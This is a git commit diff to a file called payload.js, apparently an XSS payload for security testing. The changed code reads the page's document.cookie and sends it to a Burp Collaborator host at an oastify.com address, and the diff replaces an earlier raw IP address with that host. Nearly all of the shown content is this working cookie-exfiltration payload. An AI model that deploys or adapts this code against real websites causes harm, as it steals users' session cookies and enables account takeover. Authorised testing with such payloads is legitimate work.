aa7f12f385e49e362200047861da025d5a292f56
jerry <145069865+jerryhttpd@users.noreply.github.com>
2025-03-12 12:28:38 +0530

    Update payload.js

--- payload.js
+++ payload.js
@@ -8,7 +8,7 @@ var cookies = document.cookie;
 alert("Cookies: " + cookies);
 
 // Send the cookies to your Burp Collaborator URL
-var burpCollaboratorURL = "http://13.203.103.154:8445"; // Replace with your actual Burp Collaborator URL
+var burpCollaboratorURL = "http://v51ihydl0ib3zxcdzxu2tw3tpkvbj17q.oastify.com"; // Replace with your actual Burp Collaborator URL
 var img = new Image();
 img.src = burpCollaboratorURL + "/?cookie=" + encodeURIComponent(cookies);
 
